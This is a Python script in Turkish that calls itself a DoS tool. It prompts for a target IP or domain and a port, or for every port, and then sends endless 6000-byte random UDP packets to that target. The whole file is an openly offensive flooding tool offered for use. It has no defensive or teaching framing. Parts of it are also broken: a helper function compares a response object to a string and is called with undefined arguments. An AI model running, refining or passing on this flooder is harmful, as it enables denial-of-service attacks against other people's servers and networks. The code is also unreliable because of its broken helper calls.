#!/usr/bin/env python3
#*- coding: utf-8 -*--
#Coded by Morbius.os

AUTHOR = 'Morbius.os'
GİTHUB = 'https://github.com/morbius-os'
INSTAGRAM= '@morbius.os'

Mor = '\033[95m'
Cyan = '\033[96m'
KoyuMavi = '\033[1;34m'
Mavi = '\033[94m'
Yeşil = '\033[92m'
Sarı = '\033[93m'
Kırmızı = '\033[91m'
Kalın = '\033[1m'
AltıÇizili = '\033[4m'
Bitir = '\033[0m'
Beyaz ='\033[1;37m'

import os
import socket
import time
import random
import sys
import requests

def banner():
    try:
        os.system('clear')
    except:
        os.system(cmd_clear)
    print(f"""
{Beyaz} __  __            _     _            {Kırmızı} ____             {Sarı} _____           _
{Beyaz}|  \/  | ___  _ __| |__ (_)_   _ ___  {Kırmızı}|  _ \  ___  ___  {Sarı}|_   _|__   ___ | |
{Beyaz}| |\/| |/ _ \| '__| '_ \| | | | / __| {Kırmızı}| | | |/ _ \/ __|   {Sarı}| |/ _ \ / _ \| |
{Beyaz}| |  | | (_) | |  | |_) | | |_| \__ \ {Kırmızı}| |_| | (_) \__ \   {Sarı}| | (_) | (_) | |
{Beyaz}|_|  |_|\___/|_|  |_.__/|_|\__,_|___/ {Kırmızı}|____/ \___/|___/   {Sarı}|_|\___/ \___/|_|
{Yeşil}
Author: {AUTHOR}
Instagram: {INSTAGRAM}
Github: {GİTHUB}{Bitir}""")
				
banner()
time.sleep(1.5)

def site_kontrol(site,http_formatı,uzantısı):
    URL =  http_formatı+'://'+site+uzantısı
    cevap = requests.get(URL)
    if cevap == '<Response [200]>':
        pass
    else:
        return '{}SİTE ÇÖKTÜ'.format(Kırmızı)

def site_yaz(ğ,çş,ö):
    return çş+'://'+ğ+ö
 
liste = {'q','w','e','r','t','y','u','ı','o','p','ü','ğ','a','s','d','f','g','h','j','k','l','ş','i','z','x','c','v','n','b','m','ö','ç','@','#','₺','_','&','-','+','(',')','/','*','"',"'",':',';','!','?','~','`','|','•','√','π','÷','×','§','∆','£','€','$','¢','^','°','=','{','}'}
print('\n')

target = str(input(f'''{Beyaz}Lütfen Hedefin IP Adresini Giriniz (Eğer Domain'e Dos Atacaksanız {Yeşil}"Domain"{Beyaz} Yazınız): {Yeşil}'''))

alilanz = ""
if target == "Domain" or target == 'domain':
    alilanz = 'doktor eda'

if target == "Domain" or target == 'domain':
    domain = input(f"{Beyaz}Lütfen Domain'i Subdomain ile birlikte giriniz (örnek:https:/example.com ise example.com şeklinde giriniz): {Yeşil}")
    print('\n')
    while "." not in domain:
        şş = input(f"{Kırmızı}Lütfen Domain'i Düzgün Giriniz (example.com şeklinde): {Yeşil}")
        if "." in şş:
            break
    target = socket.gethostbyname(domain)
    print(f"{Beyaz}Sitenin IP Adresi: {Yeşil}{target}{Beyaz}")

if alilanz == 'doktor eda':
    siteeee = "http://"+domain
else:
    siteeee = target
    
if alilanz == 'doktor eda':
    port = int(input(f'''{Beyaz}Lütfen {Yeşil}{AltıÇizili}{siteeee}{Bitir}{Beyaz} Linkli {Yeşil}{target}{Beyaz} IP AdresliHedef Sitenin Hedef Port Numarasını Giriniz
(Eğer Bütün Portlara Saldırı yapmak istiyorsanız {Yeşil}"1"{Beyaz} Yazınız): {Yeşil}'''))
else:
    port = int(input(f'''{Beyaz}Lütfen {Yeşil}{siteeee}{Beyaz} IP Adresli Hedefin Hedef Port Numarasını Giriniz
(Eğer Bütün Portlara Saldırı yapmak istiyorsanız {Yeşil}"1"{Beyaz} Yazınız): {Yeşil}'''))


print('\n')
try:
    if port > 65534:
        print(f'{Kırmızı}{Kalın}Lütfen Port Numarasını Düzgün Giriniz{Beyaz}')
        sys.exit()
except:
    pass

try:
     print ("""{}Hedef Domain : {}{}""".format(Beyaz,Yeşil,domain))
except NameError:
    pass

print (f"""{Beyaz}Hedef IP : {Yeşil}{target}{Beyaz}""")
if port == 1:
    print (f"""Hedef Portlar: {Yeşil}Bütün Portlar{Beyaz}
""")
else:
    print(f"""Hedef Port: {Yeşil}{port}{Beyaz}""")
    
print("""
Eğer yanlış birşey varsa lütfen tooldan çıkıp düzeltiniz.
""")
time.sleep(3)

print(f'{Kırmızı}{Kalın}Dos Atağı Başlatılıyor...\n')
time.sleep(3)

byte = random._urandom(6000)
soket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

dos_sayar = 0

if port == 1:
        while True:
            soket.sendto(byte,(target,port))
            dos_sayar = dos_sayar + 1
            print("{}Dos Atağı Başladı.{}{}{} Port'una {}{}{} Adet Paket Gönderildi.".format(Beyaz,Yeşil,port,Beyaz,Yeşil,dos_sayar,Beyaz))
            site_kontrol(domain,format,uzantı)
            port = port + 1
            if port > 65534:
                port = 1

else:
    while True:
        soket.sendto(byte,(target,port))
        dos_sayar = dos_sayar + 1
        print("{}Dos Atağı Başladı.Hedef Port'a {}{}{} Adet Paket Gönderildi.".format(Beyaz,Yeşil,dos_sayar,Beyaz))
        site_kontrol(domain,format,uzantı)
